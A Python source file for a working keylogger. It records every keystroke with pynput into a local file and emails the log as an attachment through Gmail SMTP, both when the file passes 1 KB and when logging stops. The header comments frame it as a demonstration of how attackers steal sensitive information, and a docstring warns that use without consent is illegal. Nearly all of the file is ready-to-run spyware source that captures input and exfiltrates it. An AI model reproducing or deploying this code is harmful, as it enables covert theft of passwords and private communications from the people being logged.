# We are going to implement sending emails with the keylogger.
# This is to demonstrate how an attacker might use a keylogger to steal sensitive information.
# First create .env file and add the following variables:
# EMAIL_ADDRESS=your_email_address
# EMAIL_PASSWORD=your_gmail_App_password
# Then import the variables from the .env file using python-dotenv library.
# This is important because it keeps your email address and password secure and separate from the code.
# I've removed the 10 words limit and also added a file size check to ensure that the file is large enough before sending it.
# pip install cryptography python-dotenv

'''❌ Warning: Keylogging without consent is illegal! and can lead to serious consequences.(fines, imprisonment, etc.)
You should never use this code to log someone's keystrokes without their permission.
Use it only for ethical hacking, forensics, or educational purposes.'''

# import the necessary libraries
from pynput import keyboard  # This library allows us to monitor keyboard events.
import smtplib # This library is used to send emails using the Simple Mail Transfer Protocol (SMTP).
import ssl # This library is used to create a secure connection to the email server.
import os # This library is used to interact with the operating system, like creating directories and handling files.
from email.mime.multipart import MIMEMultipart # This class is used to create a multipart email message.
from email.mime.text import MIMEText # This class is used to create the text part of the email message.
from email.mime.base import MIMEBase # This class is used to create the base for the email attachment.
from email import encoders # This library is used to encode the attachment in base64 format.
from dotenv import load_dotenv # This library is used to load environment variables from a .env file.

load_dotenv()  # Load environment variables

# Define the email server and port (Gmail in this case)
SMTP_SERVER = "smtp.gmail.com"
SMTP_PORT = 587
EMAIL_ADDRESS = os.getenv("EMAIL_ADDRESS") # Get the email address from .env file
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD") # Get the email password from .env file

# Directory and file setup
directory_path = os.path.abspath("./temp_files") # Get the absolute path of the directory
os.makedirs(directory_path, exist_ok=True) # Create the directory if it doesn't exist
file_path = os.path.join(directory_path, "keylog_2.txt") # Create the file path for the keylog file

# Adjustable minimum file size before sending email (in bytes)
MIN_FILE_SIZE = 1024  # 1 KB

# Keys to ignore
IGNORED_KEYS = {
    keyboard.Key.shift, keyboard.Key.shift_r, keyboard.Key.ctrl, keyboard.Key.ctrl_r,
    keyboard.Key.alt, keyboard.Key.alt_r, keyboard.Key.caps_lock, keyboard.Key.num_lock,
    keyboard.Key.scroll_lock, keyboard.Key.cmd, keyboard.Key.cmd_r, keyboard.Key.insert
}

# Special keys mapping
SPECIAL_KEYS = {
    keyboard.Key.space: " ",
    keyboard.Key.enter: "\n",
    keyboard.Key.tab: "\t"
}

typed_text = ""  # Buffer for typed text

#### Sending email function ####
def send_email(attachment_path):
    try:
        context = ssl.create_default_context()
        msg = MIMEMultipart()
        msg['From'] = EMAIL_ADDRESS
        msg['To'] = EMAIL_ADDRESS  # Sending to self; adjust if needed
        msg['Subject'] = "Keylogger Report"

        msg.attach(MIMEText("Find the attached keylog file.", 'plain')) # message body

        # Prepare attachment
        filename = os.path.basename(attachment_path) # Get the filename from the path
        with open(attachment_path, 'rb') as attachment: # Open the file in binary mode
            part = MIMEBase('application', 'octet-stream') # Create a MIMEBase object for the attachment
            part.set_payload(attachment.read()) # Read the file content

        encoders.encode_base64(part) # Encode the file in base64
        part.add_header('Content-Disposition', f'attachment; filename= {filename}') # Add header for the attachment
        msg.attach(part) # Attach the file to the email

        # Send email
        with smtplib.SMTP(SMTP_SERVER, SMTP_PORT) as server: # Create a SMTP server object
            server.starttls(context=context) # Start TLS for security
            server.login(EMAIL_ADDRESS, EMAIL_PASSWORD) # Login to the email server
            server.send_message(msg) # Send the email

        print("Email sent successfully!")

        # Optional: Clear the file after sending
        open(attachment_path, 'w').close() 

    except Exception as e:
        print(f"Failed to send email: {e}")    

# Check if the file exists and meets the size requirement before sending
def check_file_and_send():
    if os.path.exists(file_path): # Check if the file exists
        file_size = os.path.getsize(file_path) # Get the file size
        if file_size >= MIN_FILE_SIZE: # Check if the file size is greater than or equal to the minimum size
            send_email(file_path) # Send the email

### Keylogger function ###
def keyPressed(key):
    global typed_text # Buffer for typed text

    try:
        if key in IGNORED_KEYS:
            return

        if key == keyboard.Key.backspace:
            typed_text = typed_text[:-1]
            return

        key_str = SPECIAL_KEYS.get(key, key.char if hasattr(key, 'char') else '') # Get the string representation of the key

        # Add to buffer
        typed_text += key_str 

        # Write buffer to file continuously
        with open(file_path, "a", encoding="utf-8") as file: 
            file.write(key_str) 

        # Stop logging when ESC is pressed
        if key == keyboard.Key.esc:
            with open(file_path, "a", encoding="utf-8") as file:
                file.write(typed_text)  # Save remaining typed text
            print("\nESC key detected. Stopping keylogger...")
            return False  # Stop the listener

        # Check if file size condition is met
        check_file_and_send()

    except Exception as e:
        print(f"Error processing key: {e}")
if __name__ == "__main__":
    # Start the keylogger listener
    with keyboard.Listener(on_press=keyPressed) as listener:
        listener.join()
    send_email(file_path)  # Send email after stopping the listener
